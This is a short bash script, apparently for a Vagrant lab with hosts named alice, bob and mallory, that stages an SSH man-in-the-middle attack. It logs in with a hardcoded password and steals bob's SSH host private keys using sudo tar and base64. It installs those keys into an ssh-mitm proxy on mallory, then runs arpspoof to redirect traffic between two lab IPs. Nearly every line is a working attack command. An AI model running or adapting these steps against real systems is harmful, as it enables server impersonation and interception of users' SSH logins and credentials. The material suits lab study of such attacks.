#!/bin/bash

# initial setup, rsa binding -- I dont have ed25519 in this daemon
vagrant ssh alice -c "mkdir ~/.ssh ; ssh-keyscan -t rsa bob.test > ~/.ssh/known_hosts; sshpass -p vagrant3 ssh bob.test 'hostname -f'"

# exfil
mkdir -p ./keys
vagrant ssh bob -c """sudo tar cvzf /tmp/keys.tgz /etc/ssh/ssh_host_* ;
base64 /tmp/keys.tgz > /tmp/keys.tgz.b64 """

vagrant ssh bob -c "cat /tmp/keys.tgz.b64" > ./keys/keys.tgz.b64

# install exfil keys
EVIL=$(cat ./keys/keys.tgz.b64)
vagrant ssh mallory -c """echo -e '$EVIL' > ~/keys.tgz.b64 ; 
dos2unix ~/keys.tgz.b64 ;
base64 -d ~/*.tgz.b64 > keys.tgz ; 
tar -xvzf keys.tgz ; 
sudo cp ~/etc/ssh/ssh_host_* /home/ssh-mitm/etc/ ;
sudo chown -R ssh-mitm:ssh-mitm /home/ssh-mitm/etc/
at now + 3 minutes <<< 'sudo /root/ssh-mitm/stop.sh'
sudo /root/ssh-mitm/run.sh
bash -c 'sudo arpspoof -i enp0s8 -r -t 172.28.128.20 172.28.128.30'
"""
# intercept -- this'll kill vagrant logins if you don't have a window open

